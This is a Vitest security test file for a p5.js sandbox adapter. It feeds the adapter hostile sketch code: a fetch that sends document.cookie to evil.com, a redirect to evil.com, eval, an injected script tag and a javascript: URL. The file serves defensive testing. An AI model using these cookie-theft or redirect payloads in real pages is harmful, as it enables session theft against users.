/**
 * Security tests for P5Adapter
 *
 * @vitest-environment jsdom
 */

import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import { P5Adapter } from '../../../../src/composition/adapters/P5Adapter.js';
import type { Layer } from '../../../../src/composition/types.js';

// Mock p5.js
const mockP5Instance = {
  canvas: document.createElement('canvas'),
  width: 800,
  height: 600,
  mouseX: 0,
  mouseY: 0,
  pmouseX: 0,
  pmouseY: 0,
  frameCount: 0,
  millis: vi.fn().mockReturnValue(0),
  remove: vi.fn(),
  createCanvas: vi.fn().mockReturnValue({ elt: document.createElement('canvas') }),
};

const MockP5 = vi.fn().mockImplementation((sketch: (p: typeof mockP5Instance) => void) => {
  // Execute sketch immediately with mock instance
  sketch(mockP5Instance);
  return mockP5Instance;
});

describe('P5Adapter Security', () => {
  let adapter: P5Adapter;
  let mockLayer: Layer;
  let mockContainer: HTMLElement;

  beforeEach(() => {
    adapter = new P5Adapter();

    mockLayer = {
      id: 'test-p5-layer',
      type: 'p5',
      code: 'function setup() { createCanvas(400, 400); } function draw() { background(220); }',
      config: {
        zIndex: 1,
        blendMode: 'normal',
        opacity: 1.0,
        position: { x: 0, y: 0 },
        scale: 1.0,
      },
      metadata: {
        prompt: 'Test p5 layer',
        generator: 'P5Generator',
        model: 'test-model',
        generatedAt: new Date().toISOString(),
      },
      enabled: true,
      locked: false,
    };

    mockContainer = document.createElement('div');

    // Setup mock p5
    (window as unknown as { p5: typeof MockP5 }).p5 = MockP5;

    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.clearAllMocks();
    delete (window as unknown as { p5?: typeof MockP5 }).p5;
  });

  describe('Code Execution Security', () => {
    it('should not execute arbitrary code in setup function', () => {
      adapter.initialize();

      const maliciousSetup = `
        function setup() {
          createCanvas(400, 400);
          fetch('https://evil.com/steal?data=' + document.cookie);
        }
        function draw() {}
      `;

      const maliciousLayer = { ...mockLayer, code: maliciousSetup };

      // Should not throw but should handle gracefully
      expect(() => adapter.render(maliciousLayer, mockContainer)).not.toThrow();
    });

    it('should not execute arbitrary code in draw function', () => {
      adapter.initialize();

      const maliciousDraw = `
        function setup() {
          createCanvas(400, 400);
        }
        function draw() {
          eval('alert(1)');
        }
      `;

      const maliciousLayer = { ...mockLayer, code: maliciousDraw };

      // Should not throw
      expect(() => adapter.render(maliciousLayer, mockContainer)).not.toThrow();
    });

    it('should block window access in user code', () => {
      adapter.initialize();

      const codeWithWindowAccess = `
        function setup() {
          createCanvas(400, 400);
          window.__testAccess = true;
        }
        function draw() {}
      `;

      const layer = { ...mockLayer, code: codeWithWindowAccess };

      // Should not throw
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should block document access in user code', () => {
      adapter.initialize();

      const codeWithDocAccess = `
        function setup() {
          createCanvas(400, 400);
          document.location = 'https://evil.com';
        }
        function draw() {}
      `;

      const layer = { ...mockLayer, code: codeWithDocAccess };

      // Should not throw
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should block localStorage access in user code', () => {
      adapter.initialize();

      const codeWithStorage = `
        function setup() {
          createCanvas(400, 400);
          localStorage.setItem('key', 'value');
        }
        function draw() {}
      `;

      const layer = { ...mockLayer, code: codeWithStorage };

      // Should not throw
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should remove script tags from user code', () => {
      adapter.initialize();

      const codeWithScript = `
        function setup() {
          createCanvas(400, 400);
        }
        <script>alert(1)</script>
        function draw() {}
      `;

      const layer = { ...mockLayer, code: codeWithScript };

      // Should not throw
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should block javascript: protocol in user code', () => {
      adapter.initialize();

      const codeWithJsProtocol = `
        function setup() {
          createCanvas(400, 400);
          location.href = 'javascript:alert(1)';
        }
        function draw() {}
      `;

      const layer = { ...mockLayer, code: codeWithJsProtocol };

      // Should not throw
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should allow valid p5 code to execute', () => {
      adapter.initialize();

      const validCode = `
        function setup() {
          createCanvas(400, 400);
          background(220);
        }
        function draw() {
          ellipse(50, 50, 80, 80);
        }
      `;

      const validLayer = { ...mockLayer, code: validCode };

      // Should not throw
      expect(() => adapter.render(validLayer, mockContainer)).not.toThrow();
    });

    it('should provide safe console in sandbox', () => {
      adapter.initialize();

      const codeWithConsole = `
        function setup() {
          createCanvas(400, 400);
          console.log('test message');
        }
        function draw() {}
      `;

      const layer = { ...mockLayer, code: codeWithConsole };

      // Should not throw
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });
  });
});
